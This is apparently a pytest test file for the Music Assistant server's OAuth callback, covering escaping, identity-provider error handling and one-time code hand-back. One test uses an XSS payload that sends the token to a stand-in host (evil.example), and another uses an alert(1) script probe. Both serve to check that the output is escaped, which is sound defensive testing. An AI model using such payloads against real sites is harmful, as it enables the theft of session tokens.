"""Tests for the webserver OAuth callback."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch
from urllib.parse import quote, urlencode

import pytest
from aiohttp import web
from aiohttp.streams import StreamReader
from aiohttp.test_utils import make_mocked_request
from music_assistant_models.auth import User, UserRole
from music_assistant_models.errors import AuthenticationFailed

from music_assistant.controllers.webserver.controller import WebserverController
from music_assistant.controllers.webserver.helpers.auth_providers import AuthResult
from music_assistant.controllers.webserver.helpers.login_flow import AuthTransport, PendingLogin
from music_assistant.helpers.json import json_dumps
from music_assistant.helpers.pkce import pkce_challenge
from music_assistant.helpers.redirect_validation import build_code_redirect_url
from music_assistant.mass import MusicAssistant


async def test_auth_callback_serializes_script_values_safely(
    mass_minimal: MusicAssistant,
) -> None:
    """OAuth callback values cannot break out of their JavaScript string literals."""
    token = "LOCAL_TEST_TOKEN"
    return_url = (
        "https://my.home-assistant.io/'</script><script>"
        "fetch('https://evil.example/steal?t='+token)</script>\"\u2028\u2029"
    )
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    request = make_mocked_request(
        "GET",
        "/auth/callback?code=fakecode&state=fakestate",
        app=web.Application(),
    )

    handle_oauth_callback = AsyncMock(
        return_value=AuthResult(
            success=True,
            user=User(user_id="test", username="test", role=UserRole.USER),
            return_url=return_url,
            provider_id="homeassistant",
        )
    )
    create_token = AsyncMock(return_value=token)
    with (
        patch.object(webserver.auth, "handle_oauth_callback", new=handle_oauth_callback),
        patch.object(webserver.auth, "create_token", new=create_token),
    ):
        response = await webserver._handle_auth_callback(request)

    handle_oauth_callback.assert_awaited_once_with("fakecode", "fakestate")
    create_token.assert_awaited_once_with(
        handle_oauth_callback.return_value.user, "OAuth (homeassistant)"
    )

    redirect_url = build_code_redirect_url(return_url, token)
    safe_redirect_url = (
        json_dumps(redirect_url)
        .replace("&", "\\u0026")
        .replace("<", "\\u003c")
        .replace(">", "\\u003e")
        .replace("\u2028", "\\u2028")
        .replace("\u2029", "\\u2029")
    )
    assert response.status == 200
    assert response.text is not None
    assert f"const redirectUrl = {safe_redirect_url};" in response.text
    assert f"const token = {json_dumps(token)};" in response.text


@pytest.mark.parametrize("known_state", [True, False])
async def test_auth_callback_idp_error_consumes_state(
    mass_minimal: MusicAssistant, known_state: bool
) -> None:
    """An error from the identity provider ends the sign-in without exchanging a code."""
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    pending = webserver.auth.pending_logins.start(
        "homeassistant",
        AuthTransport.DIRECT,
        "http://localhost:8095/auth/callback",
        "verifier",
        return_url="http://localhost:8095/",
    )
    state = pending.state if known_state else "unknown-state"
    error = quote("<script>alert(1)</script>", safe="")
    request = make_mocked_request(
        "GET",
        f"/auth/callback?error={error}&error_description={error}&code=fakecode&state={state}",
        app=web.Application(),
    )

    handle_oauth_callback = AsyncMock()
    create_token = AsyncMock(return_value="LOCAL_TEST_TOKEN")
    with (
        patch.object(webserver.auth, "handle_oauth_callback", new=handle_oauth_callback),
        patch.object(webserver.auth, "create_token", new=create_token),
    ):
        response = await webserver._handle_auth_callback(request)

    handle_oauth_callback.assert_not_awaited()
    create_token.assert_not_awaited()
    assert response.status == 400
    assert response.text is not None
    assert "<script>" not in response.text
    assert "localhost:8095" not in response.text
    # only the sign-in named by the state is consumed
    assert (webserver.auth.pending_logins.pop(pending.state) is None) is known_state


@pytest.mark.parametrize("method", ["GET", "POST"])
async def test_auth_callback_hands_back_a_one_time_code(
    mass_minimal: MusicAssistant, method: str
) -> None:
    """
    A sign-in with a code challenge returns with a one-time code and the client's state.

    :param method: The method the identity provider returns the browser with.
    """
    webserver, pending = _start_challenge_sign_in(mass_minimal, "http://localhost:8095/#/login")
    issue = AsyncMock(return_value="ONE_TIME_CODE")
    create_token = AsyncMock(return_value="LOCAL_TEST_TOKEN")
    with (
        patch.object(webserver.auth, "issue_authorization_code", new=issue),
        patch.object(webserver.auth, "create_token", new=create_token),
    ):
        response = await webserver._handle_auth_callback(
            _callback_request(method, {"code": "idp_code", "state": pending.state})
        )

    assert response.status == 302
    assert response.headers["Location"] == (
        "http://localhost:8095/?code=ONE_TIME_CODE&state=client%20state#/login"
    )
    issue.assert_awaited_once_with(pending, "idp_code")
    create_token.assert_not_awaited()
    assert webserver.auth.pending_logins.get(pending.state) is None


async def test_auth_callback_hands_a_one_time_code_to_the_opener(
    mass_minimal: MusicAssistant,
) -> None:
    """Without a return URL, a page posts the one-time code to a same-origin opener."""
    webserver, pending = _start_challenge_sign_in(mass_minimal, None)
    with patch.object(
        webserver.auth, "issue_authorization_code", new=AsyncMock(return_value="ONE_TIME_CODE")
    ):
        response = await webserver._handle_auth_callback(
            _callback_request("GET", {"code": "idp_code", "state": pending.state})
        )

    assert response.status == 200
    assert response.text is not None
    assert 'const code = "ONE_TIME_CODE";' in response.text
    assert 'const state = "client state";' in response.text
    assert '"ma-auth-code"' in response.text
    assert "window.location.origin" in response.text
    assert response.headers["Cache-Control"] == "no-store"


async def test_auth_callback_hands_back_an_idp_error_with_the_state(
    mass_minimal: MusicAssistant,
) -> None:
    """An error of the identity provider goes back to the return URL with the client's state."""
    webserver, pending = _start_challenge_sign_in(mass_minimal, "musicassistant://auth/callback")
    issue = AsyncMock()
    with patch.object(webserver.auth, "issue_authorization_code", new=issue):
        response = await webserver._handle_auth_callback(
            _callback_request(
                "GET",
                {"error": "access_denied", "error_description": "No", "state": pending.state},
            )
        )

    assert response.status == 302
    assert response.headers["Location"] == (
        "musicassistant://auth/callback?error=access_denied&error_description=No"
        "&state=client%20state"
    )
    issue.assert_not_awaited()
    assert webserver.auth.pending_logins.get(pending.state) is None


async def test_auth_callback_hands_back_a_refused_sign_in(mass_minimal: MusicAssistant) -> None:
    """A sign-in the server refuses goes back to the return URL as access_denied."""
    webserver, pending = _start_challenge_sign_in(mass_minimal, "musicassistant://auth/callback")
    refuse = AsyncMock(side_effect=AuthenticationFailed("User account is disabled"))
    with patch.object(webserver.auth, "issue_authorization_code", new=refuse):
        response = await webserver._handle_auth_callback(
            _callback_request("GET", {"code": "idp_code", "state": pending.state})
        )

    assert response.status == 302
    assert response.headers["Location"] == (
        "musicassistant://auth/callback?error=access_denied"
        "&error_description=User%20account%20is%20disabled&state=client%20state"
    )


async def test_auth_callback_without_a_challenge_hands_back_the_token(
    mass_minimal: MusicAssistant,
) -> None:
    """A sign-in started without a code challenge keeps today's token hand-back."""
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    pending = webserver.auth.pending_logins.start(
        "homeassistant",
        AuthTransport.DIRECT,
        "http://localhost:8095/auth/callback",
        "verifier",
        return_url="http://localhost:8095/",
    )
    handle_oauth_callback = AsyncMock(
        return_value=AuthResult(
            success=True,
            user=User(user_id="test", username="test", role=UserRole.USER),
            return_url="http://localhost:8095/",
            provider_id="homeassistant",
        )
    )
    issue = AsyncMock()
    with (
        patch.object(webserver.auth, "handle_oauth_callback", new=handle_oauth_callback),
        patch.object(webserver.auth, "issue_authorization_code", new=issue),
        patch.object(webserver.auth, "create_token", new=AsyncMock(return_value="JWT")),
    ):
        response = await webserver._handle_auth_callback(
            _callback_request("GET", {"code": "idp_code", "state": pending.state})
        )

    assert response.status == 200
    assert response.text is not None
    assert 'const token = "JWT";' in response.text
    handle_oauth_callback.assert_awaited_once_with("idp_code", pending.state)
    issue.assert_not_awaited()


async def test_auth_callback_idp_error_without_state(mass_minimal: MusicAssistant) -> None:
    """An error without a state is answered with the error page."""
    webserver = WebserverController(mass_minimal)
    mass_minimal.webserver = webserver
    request = make_mocked_request(
        "GET", "/auth/callback?error=access_denied", app=web.Application()
    )
    response = await webserver._handle_auth_callback(request)
    assert response.status == 400
    assert response.text is not None
    assert "Authentication Failed" in response.text
    assert "access_denied" not in response.text


def _start_challenge_sign_in(
    mass: MusicAssistant, return_url: str | None
) -> tuple[WebserverController, PendingLogin]:
    """
    Start a browser sign-in with a code challenge and the client state "client state".

    :param mass: The server to start the sign-in on.
    :param return_url: The URL the sign-in returns to, if any.
    """
    webserver = WebserverController(mass)
    mass.webserver = webserver
    pending = webserver.auth.pending_logins.start(
        "homeassistant",
        AuthTransport.DIRECT,
        "http://localhost:8095/auth/callback",
        "verifier",
        return_url=return_url,
        client_code_challenge=pkce_challenge("client-verifier-" + "v" * 40),
        client_state="client state",
    )
    return webserver, pending


def _callback_request(method: str, params: dict[str, str]) -> web.Request:
    """
    Build the request of a browser that returns to the callback.

    :param method: GET with the parameters in the query, or POST with them as a form.
    :param params: The parameters the browser returns with.
    """
    if method == "GET":
        return make_mocked_request(
            "GET", f"/auth/callback?{urlencode(params)}", app=web.Application()
        )
    payload = StreamReader(MagicMock(), limit=2**16)
    payload.feed_data(urlencode(params).encode())
    payload.feed_eof()
    return make_mocked_request(
        "POST",
        "/auth/callback",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        app=web.Application(),
        payload=payload,
    )
